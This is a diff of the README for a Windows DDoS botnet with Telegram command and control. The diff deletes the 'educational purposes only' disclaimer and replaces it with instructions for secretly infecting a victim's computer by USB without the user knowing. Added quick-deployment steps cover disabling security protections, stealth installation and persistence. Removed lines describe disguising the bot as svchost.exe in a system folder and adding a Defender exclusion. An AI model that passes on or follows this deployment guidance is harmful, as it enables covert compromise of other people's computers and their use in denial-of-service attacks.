@@ -2,9 +2,10 @@
 
 A high-performance DDoS botnet controller with Telegram-based C&C (Command and Control) capabilities, designed for educational and research purposes.
 
-## ⚠️ DISCLAIMER
+## ⚠️ Intended Use 
 
-This project is intended for **educational and research purposes only**. Unauthorized use for attacking targets without explicit permission is illegal. The developers are not responsible for any misuse or damage caused by this software.
+This botnet client is designed for manual USB deployment - meaning you physically insert a USB drive into a target computer and execute the deployment script without the user knowing to manually add bots to your botnet network. This requires either physical access to the machine or social engineering the user, and requires logging in with administrator privileges to bypass security protections.
+
 
 ## 🚀 Features
 
@@ -28,6 +29,16 @@ This project is intended for **educational and research purposes only**. Unautho
   - Registry Run Keys (fallback)
   - Hidden system process naming
 
+
+## 🚀 Quick Deployment
+
+1. **Prepare USB** - Copy deploy.bat and _Data folder to USB drive
+2. **Insert & Execute** - Plug USB into target PC, run deploy.bat as Admin
+3. **Bypass Security** - Accept UAC prompt, script automatically disables protections
+4. **Stealth Install** - Bot installs to system directories with persistence
+5. **Go Live** - Bot connects to Telegram C&C - ready for commands
+
+
 ## 📁 Project Structure
 ```
 Professor-Ping/
@@ -36,7 +47,8 @@ Professor-Ping/
 └── README.md               # Project documentation
 ```
 
-## 🔧 Installation & Deployment
+
+## 🔧 Installation
 
 ### Prerequisites
 - Windows operating system
@@ -101,19 +113,7 @@ YourUSB/
     └── system.tmp  (renamed compiled executable)
 ```
 
-### Step 6: Automated Deployment
-1. Run `deploy.bat` as Administrator
-2. The script will:
-   - Copy the bot to `%ProgramData%\Microsoft\Network\Diagnostics\svchost.exe`
-   - Add Windows Defender exclusion
-   - Set hidden and system attributes
-   - Create scheduled task for persistence
-   - Start the bot service
 
-### Manual Setup Alternative
-1. Rename compiled file to `system.tmp`
-2. Copy to stealth location manually
-3. Configure persistence via Task Scheduler or registry
 
 ## 🎮 Bot Commands
 
@@ -155,6 +155,7 @@ YourUSB/
 - Total bandwidth consumption
 - Active attack monitoring
 - Performance metrics
+  
 
 ## 🔒 Security Features
 
